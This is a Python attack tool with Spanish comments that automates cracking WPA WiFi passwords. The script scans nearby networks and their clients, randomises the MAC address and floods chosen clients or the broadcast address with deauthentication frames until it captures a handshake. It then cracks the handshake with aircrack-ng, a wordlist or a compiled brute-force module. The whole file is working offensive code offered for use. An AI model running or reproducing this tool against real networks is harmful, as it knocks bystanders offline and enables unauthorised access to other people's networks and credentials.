#!/bin/python3

try:
    # Importamos librerias
    print("\n[*] Starting...")
    print("\n\t[*] Comprobando librerias...")
    import string
    import re
    import colorama
    from colorama import Fore
    import os
    import time
    import random
    import subprocess
    import threading
    import multiprocessing
    from concurrent.futures import ThreadPoolExecutor
    import os
    import argparse
    import evilCracker
    import ctypes
    time.sleep(1)
    colorama.init()
    print(Fore.GREEN + "\n[*] " + Fore.YELLOW + "Librerias importadas correctamente...\n" + Fore.RESET)

except ModuleNotFoundError as e:
    print("\n\n[!] Faltan modulos necesario para la ejecucion...\n\t%s" % e)
    print("[!] Exiting...")
    exit(1)

#
# solamente queda arrgelar lo del .so
#


def delete_files():
    # Borramos archivos innnecesarios
    os.system('find /root/EvilHunter_Data/captures -type f ! -name "*.cap" -delete > /dev/null')
    os.system('rm /root/EvilHunter_Data/espec/*')


def restart_net():
    # Reiniciamosd red
    os.system("service networking restart > /dev/null")
    os.system("service NetworkManager restart > /dev/null")


def stop_monitoring():
    # Paramos modo monitor
    if os.system("airmon-ng stop {} > /dev/null".format(interface)) != 0:
        os.system("airmon-ng stop {} > /dev/null".format(interface))


def exiting(err):
    # Salida con o sin error
    if err:
        if err == "done":
            print(Fore.YELLOW + "\n\n[*] " + Fore.RED + "Exiting tool...")

        elif err is False:
            print(Fore.YELLOW + "\n\n[*] " + Fore.RED + "Exiting, Ctrl + C recived...")

        else:
            print(Fore.YELLOW + "\n[*] " + Fore.RED + "Exiting due a error...\n\n", err)

    elif not err:
        print(Fore.YELLOW + "\n\n[*] " + Fore.RED + "Exiting, Ctrl + C recived...")

    print(
        Fore.WHITE + "\n  ·  ·  ·  · " + Fore.YELLOW + "[*] " +
        Fore.LIGHTCYAN_EX + "Restoring mac address..." + Fore.RESET

        + Fore.WHITE + "\n  ·  ·  ·  · " + Fore.YELLOW + "[*] " +
        Fore.LIGHTCYAN_EX + "Stopping monitor mode..." + Fore.RESET

        + Fore.WHITE + "\n  ·  ·  ·  · " + Fore.YELLOW + "[*] " +
        Fore.LIGHTCYAN_EX + "Restarting network services")

    try:
        restore_mac()
    except NameError:
        pass

    try:
        stop_monitoring()
    except NameError:
        pass

    print(Fore.WHITE + "  ·  ·  ·  · " + Fore.YELLOW + "[*] " + Fore.LIGHTCYAN_EX + "Deleting some files..."
          + Fore.RESET)
    delete_files()
    restart_net()

    print(Fore.YELLOW + "\n[!] " + Fore.GREEN + "Exit Succesfull")
    exit()


def am_i_root():
    # somos root?
    if os.getuid() != 0:
        print(Fore.RED + "\n[!] Necesitamos ser root...")
        exit(1)


def change_mac(interface):
    # Apagamos tarjeta de red:
    os.system("bash -c 'ifconfig {} down'".format(interface))

    # Modificamos direccion MAC
    os.system(f"macchanger -r {interface} > new_mac.txt")
    mc = os.system("cat new_mac.txt  | grep 'New' | awk '{print $2}' FS='MAC:' | awk '{print $1}' > mac.txt")

    # Encendemos tarjeta de red
    os.system(f"bash -c 'ifconfig {interface} up'")

    if mc == 0:
        mac = open("mac.txt", "r")
        mac = mac.read()
        return mac
    else:
        return None


def restore_mac():
    # Apagamos tarjeta de red:
    os.system("ifconfig {} down > /dev/null".format(interface))

    os.system("airmon-ng check kill > /dev/null")
    os.system(f"macchanger -p {interface} > /dev/null")

    # Encendemos tarjeta de red
    os.system('ifconfig {} up > /dev/null'.format(interface))


def check_utilities():
    # Comprobamos herramientas necesarias
    non_installed = {}
    tools = 0

    print(Fore.YELLOW + "\n[*] " + Fore.BLUE + "Comprobando herramientas necesarias...\n")

    # Comprobamos todas la herramientas...
    if os.system("command -v airmon-ng > /dev/null") != 0:
        non_installed["airmon-ng"] = False
    else:
        non_installed["airmon-ng"] = True

    if os.system('command -v aircrack-ng > /dev/null') != 0:
        non_installed["aircrack-ng"] = False
    else:
        non_installed["aircrack-ng"] = True

    if os.system('command -v aireplay-ng > /dev/null') != 0:
        non_installed["aireplay-ng"] = False
    else:
        non_installed["aireplay-ng"] = True

    if os.system('command -v airodump-ng > /dev/null') != 0:
        non_installed["airodump-ng"] = False
    else:
        non_installed["airodump-ng"] = True
    if os.system('command -v airdecap-ng > /dev/null') != 0:
        non_installed["airdecap-ng"] = False
    else:
        non_installed["airdecap-ng"] = True
    if os.system("command -v macchanger > /dev/null") != 0:
        non_installed["macchanger"] = False
    else:
        non_installed["macchanger"] = True

    for tool in non_installed:
        time.sleep(0.4)

        if tool in ["aireplay-ng", "airodump-ng", "airmon-ng", "airdecap-ng"]:
            if not non_installed[tool]:
                print(Fore.WHITE + "  ·  ·  ·  · " + Fore.YELLOW + "[!] " + Fore.LIGHTCYAN_EX +
                      "La herramienta " + Fore.GREEN + "aircrack-ng" + Fore.LIGHTCYAN_EX +
                      " no está instalada correctamente...")
                exit(1)

        elif not non_installed[tool]:
            print(Fore.WHITE + "  ·  ·  ·  · " + Fore.YELLOW + "[!] " + Fore.LIGHTCYAN_EX +
                  "La herramienta " + Fore.GREEN + f"{tool}" + Fore.LIGHTCYAN_EX + " no está instalada.")

        elif non_installed[tool]:
            print(Fore.WHITE + "  ·  ·  ·  · " + Fore.YELLOW + "[*] " + Fore.LIGHTCYAN_EX +
                  "La herramienta " + Fore.GREEN + f"{tool}" + Fore.LIGHTCYAN_EX + " está instalada.")
            tools += 1

    if tools != 2:
        print(Fore.RED + "\n[!] " + Fore.YELLOW +
              "Es necesario contrar con todas las herramientas para ejecutar el script...")
        exit(1)
    else:
        print(Fore.YELLOW + "\n[*] " + Fore.BLUE + "Las dependencias están intstaladas... \n")
        time.sleep(1)


def kill_conects():
    # Matamos todas las conexiones
    os.system("airmon-ng check kill > /dev/null")


def monitor_mode(choosed_interface):
    global interface

    # Modo monitor y verificar estado con "iwconfig"
    os.system("airmon-ng start %s > /dev/null" % choosed_interface)

    # Ver nombre de la interfaz
    os.system("ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > /root/EvilHunter_Data/espec/intif")
    os.system("cat /root/EvilHunter_Data/espec/intif | grep {} > /root/EvilHunter_Data/espec/iface"
              .format(choosed_interface))

    # leemos archivo de la interfaz (seleccionada)
    with open("/root/EvilHunter_Data/espec/iface", "r") as iface:
        interface = iface.read()
    interface = interface.replace("\n", "")

    print(Fore.BLUE + "\n\t[" + Fore.RED + "V" + Fore.BLUE + "] " + Fore.YELLOW +
          "Cambiando MAC address de " + Fore.LIGHTCYAN_EX + f"{choosed_interface}" + Fore.RESET)
    try:
        # Intentamos cambiar mac address
        mac = change_mac(interface).strip()
    except AttributeError as e:
        exiting(err=e)

    if mac:
        print(Fore.BLUE + "\n\t[" + Fore.RED + "V" + Fore.BLUE + "] " + Fore.YELLOW +
              "Dirección MAC actual: " + Fore.LIGHTCYAN_EX + f"{mac}.")
    else:
        print(Fore.BLUE + "\n\t[" + Fore.RED + "V" + Fore.BLUE + "] " + Fore.LIGHTYELLOW_EX +
              "Dirección MAC no modificada correctamente..." + Fore.LIGHTCYAN_EX + f"{mac}.")

    # Miramos si esta en modo monitor
    os.system("iwconfig {} | grep -Eo 'Mode:([A-Z][a-z]+)' | cut -d: -f2 > /root/EvilHunter_Data/espec/mode"
              .format(interface))

    # Leemos archhivo sobre el modo en el que está
    with open("/root/EvilHunter_Data/espec/mode", "r") as mde:
        mode = mde.read().strip()
    try:
        if mode != "Monitor":
            return 1
        else:
            return 0
    except Exception as err:
        exiting(err)


def list_save_interf():
    print(Fore.YELLOW + "\n[*] " + Fore.LIGHTCYAN_EX + "Mostrando Intefaces Disponibles...")

    time.sleep(1)
    # Creamos archivo con interfaces disponibles
    os.system("ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > /root/EvilHunter_Data/espec/net")
    nums = 0
    with open("/root/EvilHunter_Data/espec/net", "r") as ifaces:
        ifa = ifaces.read()
    ifaces = ifa.split("\n")

    for iface in ifaces:
        if not iface:
            continue
        nums += 1
        print(Fore.YELLOW + f"\n\t{nums})." + Fore.BLUE + " {}".format(iface))

    global choosed_interface
    choosed_interface = None

    while not choosed_interface:
        choosed_interface = input(Fore.YELLOW + "\n[!>] " + Fore.WHITE + "Nombre de la interfaz (E.j wlan0): ")
        if choosed_interface not in ifaces:
            print(Fore.YELLOW + "\n\t[!] " + Fore.RED + "La interfaz {} no existe".format(choosed_interface))
            choosed_interface = None
        else:
            if os.system("airmon-ng | grep {} > /dev/null".format(choosed_interface)):
                print(Fore.YELLOW + "\n\t[!] " + Fore.RED + "La interfaz " + Fore.BLUE + f"{choosed_interface}" +
                      Fore.RED + " no compatible...")
                choosed_interface = None

    init_start_attack(choosed_interface)


def init_start_attack(choosed_interface):

    print(Fore.YELLOW + "\n[*] " + Fore.BLUE + "Preparing...")

    print(Fore.BLUE + "\n\t[" + Fore.RED + "V" + Fore.BLUE + "] " + Fore.YELLOW + "Matando todas las conexiones...")
    kill_conects()
    time.sleep(1)
    print(Fore.BLUE + "\n\t[" + Fore.RED + "V" + Fore.BLUE + "] " + Fore.YELLOW +
          "Estableciendo " + Fore.LIGHTCYAN_EX + f"{choosed_interface}" + Fore.YELLOW + " en modo monitor..."
          + Fore.RESET)

    if monitor_mode(choosed_interface) == 0:
        print(Fore.BLUE + "\n\t[" + Fore.RED + "V" + Fore.BLUE + "] " + Fore.YELLOW +
              "Interfaz " + Fore.LIGHTCYAN_EX + f"{choosed_interface}" + Fore.YELLOW +
              " establecida en modo monitor correctamente")
        prepared = True
        pass
    else:
        print(Fore.RED + "\n\t[" + Fore.YELLOW + "V" + Fore.RED + "] " + Fore.YELLOW +
              "La interfaz " + Fore.LIGHTCYAN_EX + f"{choosed_interface}" + Fore.YELLOW +
              " no se ha establecido en modo monitor correctamente...")
        exiting(err=True)
        prepared = False

    if prepared:
        print(Fore.YELLOW + "\n[*] " + Fore.BLUE + "Prepared to start capturing data...")


def get_options(args):
    hand = subprocess.Popen(["airodump-ng", f"{interface}"], stdout=subprocess.PIPE)

    all_got = []
    print(Fore.YELLOW + "\n[*] " + Fore.LIGHTCYAN_EX + "[CTRL + C] to stop..." + Fore.RESET)
    input(Fore.LIGHTRED_EX + "\n\t\t[ENTER] To continue")
    while True:
        try:
            output = hand.stdout.readline()
            if not output:
                break
            if output not in all_got:
                all_got.append(output)
            print(output.decode().strip())
        except KeyboardInterrupt:
            break
    print(Fore.LIGHTCYAN_EX + "\n\n[*] " + Fore.RESET + "Ended session of capture data...")
    print(Fore.BLUE + "\n\t[T] " + Fore.YELLOW + "Packets captured...")

    with open("/root/EvilHunter_Data/espec/data", "wb") as data:
        for line in all_got:
            data.write(line)

    macs = filter_data()
    net_clients = clients_process_data(macs)
    network_process_data(macs, net_clients, args, all_got)


def filter_data():
    # Filtramos data por macs (todas)
    os.system('cat /root/EvilHunter_Data/espec/data | grep -Eo "(([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2}))"'
              ' | sort -u > /root/EvilHunter_Data/espec/macs')

    # leemos archivo de macs
    with open("/root/EvilHunter_Data/espec/macs", "r") as macs:
        macs = macs.read().split()
    return macs


def get_bssid_and_client(validate):
    # Buscamos dos macs seguidas juntas (bssid y cliente), si no continuamops
    bssid_and_client = re.search(
        "((([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2}))+ +(([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})))", validate)
    bssid_and_client = bssid_and_client.group(1)
    bssid_and_client = bssid_and_client.split(" ")

    # Definimos cliente y acces point
    bssid = bssid_and_client[0]
    client = bssid_and_client[1]
    return bssid, client


def clients_process_data(macs):
    # Dict con bssid y clientes
    net_clients = {'networks': {}}
    client_num = 0
    net_num = 0
    existing_networks = {}

    # Recorremos las macs
    for mac in macs:
        # Creamos archivi con bssid y cliente si existe y si no continuamos
        os.system("cat /root/EvilHunter_Data/espec/data | grep " + mac +
                  " | cut -d' ' -f 2,4 | sort -u > /root/EvilHunter_Data/espec/validate")

        with open('/root/EvilHunter_Data/espec/validate', "r") as validate:
            validate = validate.read()

        try:
            # recogemos bssid y cliente mac
            bssid, client = get_bssid_and_client(validate)

            # Buscamos el bssid en el diccionario
            if bssid in existing_networks:
                net_index = existing_networks[bssid]

                # Si el cliente no existe, creamos seccion
                if client not in net_clients['networks'][net_index][bssid]['clients'].values():
                    client_num = max(net_clients['networks'][net_index][bssid]['clients'].keys()) + 1
                    net_clients['networks'][net_index][bssid]['clients'][client_num] = client

            # Si no está creamos sección
            else:
                existing_networks[bssid] = net_num
                net_clients['networks'][net_num] = {bssid: {'clients': {client_num: client}}}
                net_num += 1

            client_num += 1
        except AttributeError:
            continue
        # limpiamos numero de clientes de red
        client_num = 0

        # Borramos archivo validate
        os.remove("/root/EvilHunter_Data/espec/validate")

    return net_clients


def network_process_data(macs, net_clients, args, all_got):
    net_specs = {}
    for mac in macs:
        if not mac:
            continue

        os.system("cat /root/EvilHunter_Data/espec/data | grep {} | sort -u > /root/EvilHunter_Data/espec/{}"
                  .format(mac, mac))

        with open("/root/EvilHunter_Data/espec/" + mac, "rb") as all_data:
            all_data = all_data.read()
        data = all_data.decode().split()

        obetives = []
        num = 0

        for itera in data:
            num += 1
            if itera not in obetives:
                obetives.append(itera)

        info = "  ".join(obetives)
        n_d = 0
        if re.findall("-[0-9]+", info):
            try:
                encription = re.findall("WPA[0-9]+", info)[0]
            except IndexError:
                continue

            enc2 = info.split()[info.split().index(encription) + 1]
            enc3 = info.split()[info.split().index(encription) + 2]
            encryption = encription + " " + enc2 + " " + enc3

            if not encription:
                encryption = re.findall("WPA", info)
                if not encryption:
                    continue

            # Definimos información de la red
            power = re.search("-[0-9]+", info)
            power = power.group()
            channel = info.split()[info.split().index(encription) - 2]
            name = info.split()[info.split().index(encription) + 3]

            if re.findall("^(<length:*)", name):
                name = f"N/D_{n_d}"
                n_d += 1

            net_specs[name] = {"bssid": mac,
                               "encription_type": encryption,
                               "channel": channel,
                               "power": power}

        else:
            continue
    print_process_data(net_specs, net_clients, args, all_got)


def print_process_data(net_specs, net_clients, args, all_got):
    print(Fore.BLUE + "\n\t[Y] " + Fore.YELLOW + "Processing data")
    time.sleep(1)

    with open("/root/EvilHunter_Data/espec/data", "wb") as data:
        for line in all_got:
            data.write(line)

    print(Fore.LIGHTCYAN_EX + "\n[" + Fore.RED + "V" + Fore.LIGHTCYAN_EX + "] " + Fore.YELLOW +
          "Listing aviable networks to attack...")

    # Asingamos variables necesarias
    net = 0

    print(Fore.YELLOW + "\n\t[*] " + Fore.LIGHTCYAN_EX + "Preparing information for networks...".format(net) +
          Fore.RESET)

    for network in net_specs:
        clients = None
        net += 1

        # RED INFO:
        bssid = net_specs[network]['bssid']
        channel = net_specs[network]['channel']
        cipher_type = net_specs[network]["encription_type"]
        power = net_specs[network]["power"]

        time.sleep(0.5)

        print(Fore.YELLOW + f"\n\t{net}.[*] " + Fore.RED + "Name -> " + Fore.GREEN + "{}\n".format(network) + "\n\t\t" +
              Fore.YELLOW + "[+] " + Fore.BLUE + "BSSID -> " + Fore.GREEN + "{}".format(bssid) + "\t\t"
              + Fore.YELLOW + "[+] " + Fore.BLUE + "Channel -> " + Fore.GREEN + "{}".format(channel) +
              "\t\t" + Fore.YELLOW + "[+] " + Fore.BLUE + "Encryption -> " + Fore.GREEN + "{}".format(cipher_type) +
              "\t\t" + Fore.YELLOW + "[*] " + Fore.BLUE + "Power -> " + Fore.GREEN + "{}\n".format(power))

        # CLIENTES INFO:
        for net_num in net_clients['networks']:
            try:
                if net_clients['networks'][net_num][bssid]:
                    clients = net_clients['networks'][net_num][bssid]['clients']
                    break
            except KeyError:
                continue

        if clients:
            # Clients of the net:
            text = Fore.YELLOW + "\n\n\t\t\t\t     [♦]" + Fore.MAGENTA + "   AVIABLE / DETECTED CLIENTS."
            print(text)
            print(Fore.YELLOW + "\t\t\t\t" + "-" * len(text))

            for client_num in clients:
                client = clients[client_num]
                print(Fore.RED + "\t\t\t\t\t  [!] " + Fore.BLUE + f"{client_num} ---> " + Fore.WHITE + f"{client}")

        else:
            text = Fore.WHITE + "\n\n\t\t\t\t     [♦]    NO DETECTED CLIENTS..."
            print(text)
            print("\t\t\t\t" + "-" * len(text))

        print("\n\n\t", Fore.LIGHTYELLOW_EX + "▄" * 135, "\n\n")
    select_network(net_specs, net_clients, args)


def select_network(net_specs, net_clients, args):
    network_to_attack = None
    while not network_to_attack:
        network_to_attack = input(Fore.YELLOW + "\n[!>] " + Fore.WHITE + "Network to attack (E.j 'MOVISTAR_XXXX'): ")

        if network_to_attack not in net_specs:
            print(Fore.YELLOW + "\n\t[!] " + Fore.RED + "La red {} no ha sido detectada..".format(network_to_attack))
            network_to_attack = None
        else:
            print(Fore.YELLOW + "\n\t[*] " + Fore.LIGHTCYAN_EX + "Red encontrada!")
            time.sleep(0.5)
            print(Fore.LIGHTCYAN_EX + "\n[*] " + Fore.YELLOW + "Preparando entorno...")

    prepare_attack(net_specs, net_clients, network_to_attack, args)


def prepare_attack(net_specs, net_clients, network_to_attack, args):
    file = None
    clients = {}
    while not file:
        file = input(Fore.YELLOW + "\n\t[" + Fore.RED + "S" + Fore.YELLOW + "] " + 
                     Fore.LIGHTCYAN_EX + "Enter the name of the file to save [E.j capture1] > ")

        if os.system("find /root/EvilHunter_Data/captures/{}/{}* 2>/dev/null 1>/dev/null"
                     .format(network_to_attack, file)) == 0:
            print(Fore.RED + "\n\t\t[!] " + Fore.YELLOW + "Este nombre ya esta usado por algún archivo.")
            file = None

    # Definimos bssid y channel
    bssid = net_specs[network_to_attack]['bssid']
    ch = net_specs[network_to_attack]['channel']

    # Leer handshake
    direc = "/root/EvilHunter_Data/captures/" + network_to_attack

    for num_net in net_clients['networks']:
        try:
            clients = net_clients['networks'][num_net][bssid]
        except KeyError:
            continue

    if clients:
        attack_client = print_clients(net_clients, bssid)
    else:
        attack_client = None

    time.sleep(1)
    print(Fore.YELLOW + "\n[*] " + Fore.LIGHTRED_EX + "INICIANDO:" + Fore.LIGHTCYAN_EX + " Captura de " +
          Fore.RED + 'WPA handshake ' + Fore.LIGHTCYAN_EX +
          Fore.YELLOW + "ESPERE... --->  " + Fore.LIGHTCYAN_EX + "[CTRL + C] to stop manually..." + Fore.RESET)

    input(Fore.YELLOW + "\n\t\t[ENTER] To continue\n")
    time.sleep(0.2)
    capture = multiprocessing.Process(target=capture_handshake(direc, args, bssid, ch,
                                                               file, network_to_attack, attack_client))

    # Iniciamos la captura del handshake y envio de deauth
    capture.start()

    # Juntamos para detener
    capture.join()


def print_clients(net_clients, bssid):

    print(Fore.YELLOW + "\n\n[*] " + Fore.LIGHTBLUE_EX + "Listing clients of the network\n" + Fore.RESET)
    print("\tPara atacar a más de 1 cliente, ¡Números seguidos por coma!:\n\n\t\t\t" + Fore.RED + " [E.j: 1,2]\n")

    # CLIENTES DE RED INFO:
    for net_num in net_clients['networks']:
        try:
            if net_clients['networks'][net_num][bssid]:
                clients_of_net = net_clients['networks'][net_num][bssid]['clients']
                break
        except KeyError:
            continue

    # Recorremos clientes de la red seleccionada
    for client_num in clients_of_net:
        client = clients_of_net[client_num]
        print("\t" + Fore.RED + f"{client_num} ---> " + Fore.WHITE + f"{client}\n")

    return select_client(clients_of_net)


def select_client(clients):
    # Escogemos un cliente
    clients_to_attack = []
    clients_to_do_attack = None

    while not clients_to_do_attack:
        clients_to_do_attack = None
        num_client = input(Fore.YELLOW + "\n[!>] " + Fore.WHITE + "Client or clients to attack (E.j '1'): ")
        num_clients = num_client.replace(" ", "").split(",")

        if len(num_clients) > 1:
            for client in num_clients:
                if clients_to_do_attack == 0:
                    break
                clients_to_do_attack = verify_clients(client, clients, clients_to_attack)

            if clients_to_do_attack != 0:
                break

        else:
            clients_to_do_attack = verify_clients(num_client, clients, clients_to_attack)
            if clients_to_do_attack != 0:
                break
            else:
                clients_to_do_attack = None

    # Devolvemos cliente a atacar
    return clients_to_do_attack


def verify_clients(client, clients, clients_to_attack):
    try:
        client = int(client)
    except ValueError:
        print(Fore.YELLOW + "\n\t[!] " + Fore.RED + "Carácter invalido... ['{}']".format(client))
        client = None

    # Si no existe el numero de cliente, seguimos preguntando
    if client not in clients:
        print(Fore.YELLOW + "\n\t[!] " + Fore.RED + "El cliente Nº{} no ha sido detectado..".format(client))
        return 0

    # Si existe rompemos bucle y seguimos...
    elif client in clients:
        print(Fore.YELLOW + "\n\t[*] " + Fore.LIGHTCYAN_EX + "Cliente encontrado! -->", client)
        clients_to_attack.append(clients[client])
        time.sleep(0.5)

    return clients_to_attack


def  capture_handshake(direc, args, bssid, ch, file, network_to_attack, attack_client):
    global pids
    if not os.path.exists(f"/root/EvilHunter_Data/captures/{network_to_attack}/"):
        os.makedirs(f"/root/EvilHunter_Data/captures/{network_to_attack}/")

    hand = subprocess.Popen(["airodump-ng", "-w", f"/root/EvilHunter_Data/captures/{network_to_attack}/"
                             + file, "-c", ch, "--bssid", bssid,
                             f"{interface}"], stdout=subprocess.PIPE)
    threads = []
    pids = []

    # Si tenemos cliente  para atacar:
    if attack_client is not None:   # 1 solo client
        if len(attack_client) == 1:
            time.sleep(0.2)
            thread = threading.Thread(target=deauth_client, args=(bssid, attack_client[0], pids))
            thread.start()
            threads.append(thread)

        elif len(attack_client) > 1:   # Mas de 1 clients
            for client in attack_client:
                time.sleep(0.2)
                thread = threading.Thread(target=deauth_client, args=(bssid, client, pids))

                thread.start()
                threads.append(thread)

    # Si no al broadcast
    elif attack_client is None:
        time.sleep(0.2)
        thread = subprocess.Popen(['aireplay-ng', '--deauth', "0", "-a", bssid, interface],
                         stdout=subprocess.DEVNULL)
        pids.append(thread.pid)

    done = False
    while True:
        try:
            output = hand.stdout.readline()
            print(output.decode().strip())
            if "WPA handshake:".encode() in output:
                time.sleep(0.8)
                # Dejamos que se envien correctamente todos los paquetes
                done = True
                # Rompemos búcle
                break

        except KeyboardInterrupt:
            break 

    # Esperar a que todos los hilos terminen
    if threads:
        for pid in pids:
            os.kill(pid, 9)
    else:
        os.kill(pids[0], 9)

    print(Fore.LIGHTCYAN_EX + "\n\n\n\n\n\n\n\n\n\n\n\n[T] " + Fore.YELLOW + "Comprobando captura de hanshake")
    os.system(f'chmod -R 777 /root/EvilHunter_Data/captures/{network_to_attack}/')
    if done:
        print(Fore.LIGHTYELLOW_EX + "\n\t[V] " + Fore.CYAN + "Handskake capturado...\n\n")
    else:
        print(Fore.RED + "\n\t[T] " + Fore.YELLOW + "Hanshake no capturado...\n\n")
        exiting(err=True)
    crack_handshake(direc, args, file, network_to_attack)


def deauth_client(bssid, client, pids):
    deauth = subprocess.Popen(['aireplay-ng', '--deauth', '0', '-a', bssid, '-c', client, interface],
                              stdout=subprocess.DEVNULL)
    pids.append(deauth.pid)

def find_wordlists(wordlists):
    found = os.system("find {} > /dev/null".format(wordlists))
    while found != 0:
        print(Fore.YELLOW + "[!] " + Fore.RED + "Diccionario no encontrado, introduzca la ruta completa...")
        wordlists = input(Fore.YELLOW + "\n\t[!>] " + Fore.WHITE)
        found = os.system("find {}  > /dev/null".format(wordlists))

    return wordlists


def startbrute_c(network_to_attack, file, large, threads):
    try:
        if large == "r":
            large = 0

        #so_file_path = os.path.join(os.path.dirname(script_path), "archivo.so")
        if not os.path.isfile("/usr/local/bin/evilCrackerc.so"):
            os.system("gcc -shared -o /usr/local/bin/evilCrackerc.so -fPIC -pthread /usr/local/bin/evilCracker.c")

        print(Fore.YELLOW + "[>] " + Fore.LIGHTCYAN_EX + "Starting brute force C module...\n\n" + Fore.RESET) 
        network_to_attack = network_to_attack.encode()
        file = file.encode() 
 
        # Cargar la biblioteca compartida
        #lib = ctypes.CDLL(f"{directory}/C/evilCracker_c.so")
        lib = ctypes.CDLL("/usr/local/bin/evilCrackerc.so")

        # Especificar el tipo de retorno y los argumentos de la función init_crack_cap
        lib.init_crack_cap.restype = None
        lib.init_crack_cap.argtypes = (ctypes.c_int, ctypes.c_char_p, ctypes.c_char_p, ctypes.c_int)

        # Llamar a la función init_crack_cap
        result = lib.init_crack_cap(int(large), network_to_attack, file)
    except KeyboardInterrupt:
        ctypes.cdll.unload(lib._handle)
        exiting(err=False)


def init_brute_c(network_to_attack, file, large, threads):
    brute = threading.Thread(target=startbrute_c, args=(network_to_attack, file, large, threads))
    brute.start()
    brute.join()


def crack_handshake(direc, args, file, network_to_attack):
    # Buscamos archivo .cap
    os.system("find {}/{}*.cap > /root/EvilHunter_Data/espec/capture_file ".format(direc, file))

    # Abrimos el capture_file donde se encuentra la ruta hacia  el .cap
    with open("/root/EvilHunter_Data/espec/capture_file", "r") as file:
        file = file.read().strip()

    # Comprobamos si nos ha pasasdo discionario y si existe en su sistema o si quiere brute
    if args.wordlist:
        wordlist = find_wordlists(args.wordlist)

    elif args.brute:
        if args.threads:
            try:
                fnd = multiprocessing.Process(init_brute_c(network_to_attack, file, args.brute, args.threads))
                fnd.start()
            except Exception:
                fnd = multiprocessing.Process(evilCracker.startbrute(file, args.brute, args.threads, network_to_attack))
                fnd.start()
        else:
            try:
                fnd = multiprocessing.Process(init_brute_c(network_to_attack, file, args.brute, 500))
                fnd.start()
            except Exception:
                fnd = multiprocessing.Process(evilCracker.startbrute(file, args.brute, 500, network_to_attack))
                fnd.start()
 
        exiting(err="done") 

    print(Fore.YELLOW + "\n\t[!] " + Fore.LIGHTCYAN_EX + "Abriendo archivo '.cap'\n" + Fore.RESET)
    # input(Fore.LIGHTCYAN_EX + "\n[ENTER] " + Fore.YELLOW + "To continue\n\n" + Fore.RESET)
    time.sleep(3)

    # Empezamos con el crack de la password
    crack = subprocess.Popen(["aircrack-ng", file, "-w", wordlist], stdout=subprocess.PIPE)

    # Mostramos la salida hasta que se encuentre la contraseña (o no)
    while True:
        try:
            output = crack.stdout.readline()
            print(output.decode().strip())
            if "KEY NOT FOUND".encode() in output:
                found = False
                break
            elif "KEY FOUND".encode() in output:
                found = True
                break
        except KeyboardInterrupt:
            crack.terminate()
            found = None
            break

    if not found:
        print(Fore.RED + "\n\n\n\n\n\n\n\n\n\n\n\n[!] " + Fore.LIGHTYELLOW_EX + "La clave no se ha encontrado...")
        print(Fore.LIGHTCYAN_EX + "\n\t[*] " + Fore.LIGHTYELLOW_EX + "Quieres probar un ataque de fuerza bruta? ")
        s = input("\n\t\t[S/N] -> ")

        if s.lower() == "s":
            if args.threads:
                evilCracker.startbrute(file, "r", args.threads, network_to_attack)
            else:
                evilCracker.startbrute(file, "r", 200, network_to_attack)
        else:
            exiting(err='done')


def organize_dirs():
    if not os.path.exists("/root/EvilHunter_Data"):
        os.makedirs("/root/EvilHunter_Data")
        os.system('chmod 777 /root/EvilHunter_Data')
    if not os.path.exists("/root/EvilHunter_Data/captures"):
        os.makedirs("/root/EvilHunter_Data/captures")
        os.system('chmod 777 /root/EvilHunter_Data/captures')
    if not os.path.exists("/root/EvilHunter_Data/espec"):
        os.makedirs("/root/EvilHunter_Data/espec")
        os.system('chmod 777 /root/EvilHunter_Data/espec')


def main():
    try: 
        # Recogemos argumentos
        parser = argparse.ArgumentParser()
        
        # Argumento de diccionario
        parser.add_argument("-w", "--wordlist", help="Set diccionary attack, specify an extern wordlists dictionary  "
                                                     "USAGE:  -w /path/to/dict\n", required=False)
        
        # Argumento de fuerza bruta
        parser.add_argument("-b", "--brute", help="Use password generator for brute force   USAGE: -b "
                                                  "[length passwords / r (random)] E.j: -b 12 ",
                            required=False)
        
        # Argumento de hilos
        parser.add_argument("-t", "--threads", help="Specify the number of threads", required=False)
        
        args = parser.parse_args()

        # Checkeamos argumentos que estén bien...
        if not args.wordlist and not args.brute:
            print(Fore.RED + "[!] ERROR: " + 
                  Fore.YELLOW + "Debes introducir un parámetro...\n\t [ --help / -h ] for help")
            exit(1)

        elif args.brute:

            if args.threads:
                try:
                    num = int(args.threads)
                except ValueError:
                    print(Fore.RED + "[!] " + Fore.LIGHTYELLOW_EX + "Opción inválida...\n\tIntroduce un NUMERO...")
                    exit(1)

                if num > 500 or num < 20: 
                    print(Fore.RED + "[!] " + Fore.LIGHTYELLOW_EX + "Opción inválida...\n\tIntroduce el numero "
                                                                    "entre 20-500...")
                    exit(1) 


            if args.brute != "r":
                if int(args.brute) > 25 or int(args.brute) <= 7:
                        print(Fore.RED + "[!] " + Fore.LIGHTYELLOW_EX + "Opción inválida...\n\t¡El máximo de caracteres de contraseña son 25 y minimo 8!")
                        exit(1)
                for num in args.brute:
                    if num not in string.digits:
                        print(Fore.RED + "[!] " + Fore.LIGHTYELLOW_EX + "Opción inválida...\n\tIntroduce el largo de "
                                                                        "las contraseñas o 'r' para random length")
                        exit(1)
                    

        # Somos root?
        am_i_root()

        # Carpetas necesarias
        organize_dirs()

        # Tenemos las herraientas?
        check_utilities()

        # Listamos interfaces
        list_save_interf()

        # Escanemos redes cercanas
        get_options(args)

        # Borramos datos
        exiting(err="done")

    # Salida manual
    except KeyboardInterrupt:
        exiting(err=False)


if __name__ == "__main__":
    main()
